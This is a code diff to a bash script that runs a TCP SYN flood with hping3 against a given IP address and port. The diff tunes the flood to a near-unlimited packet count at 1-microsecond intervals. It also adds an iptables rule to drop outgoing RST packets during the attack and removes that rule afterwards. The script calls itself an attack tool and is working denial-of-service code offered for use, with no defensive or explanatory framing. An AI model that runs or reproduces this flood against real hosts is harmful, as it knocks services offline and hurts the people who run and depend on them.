@@ -11,10 +11,11 @@ function print_help ()
   exit
 }
 
-ip_destination="";
-port="";
-flood="";
-count="";
+ip_destination=""
+port=""
+flood=""
+count=""
+interval="-i u5"
 
 while [[ $# -gt 0 ]]; do
   ARG="$1"
@@ -30,7 +31,8 @@ while [[ $# -gt 0 ]]; do
       shift
       ;;
     "-f"|"--flood")
-      flood="--flood"
+      count="-c 9999999999999999"
+      interval="-i u1"
       shift
       ;;
     "-c"|"--count")
@@ -71,4 +73,9 @@ iptables -I OUTPUT 1 -d $ip_destination -p tcp --tcp-flags RST RST -j DROP
 
 echo "Attacking remote $ip_destination and port $port"
 
-hping3 $count -M 0 -i u5  $flood -S "$ip_destination" -p "$port" >> /var/log/hping3.log 2>&1
+hping3 $count -M 0 $interval -S "$ip_destination" -p "$port" >> /var/log/hping3.log 2>&1
+
+#Cleaning iptables
+echo "Done! Attack finished"
+iptables -D OUTPUT -d $ip_destination -p tcp --tcp-flags RST RST -j DROP;
+exit 0
